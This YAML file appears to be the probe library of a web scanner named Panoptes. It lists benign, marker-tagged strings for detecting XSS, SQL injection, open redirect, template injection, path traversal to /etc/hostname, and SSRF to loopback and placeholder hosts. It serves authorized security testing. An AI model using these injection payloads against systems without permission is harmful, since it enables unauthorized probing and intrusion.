# Panoptes payload library — detection probes for authorized testing.
# These are deliberately benign/self-identifying probes used to *detect*
# injection points, not weaponized exploits. The {marker} placeholder is
# substituted with a unique per-request token so reflections are unambiguous.

xss:
  - "<panoptes{marker}>"
  - "\"'><panoptes{marker}>"
  - "javascript:/*{marker}*/"
  - "<svg/onload=/*{marker}*/>"

sqli:
  - "'"
  - "')"
  - "\" OR '1'='1' -- {marker}"
  - "1) AND SLEEP(0)-- {marker}"   # zero-delay: timing-safe probe

open_redirect:
  - "https://panoptes-redirect-probe.example/{marker}"
  - "//panoptes-redirect-probe.example/{marker}"
  - "/\\panoptes-redirect-probe.example/{marker}"

ssti:
  - "panoptes{{{{7*7}}}}{marker}"
  - "panoptes${{7*7}}{marker}"
  - "panoptes#{{7*7}}{marker}"

lfi:
  - "../../../../etc/hostname%00{marker}"
  - "....//....//etc/hostname"

ssrf:
  - "http://panoptes-ssrf-probe.example/{marker}"
  - "http://[::1]/{marker}"
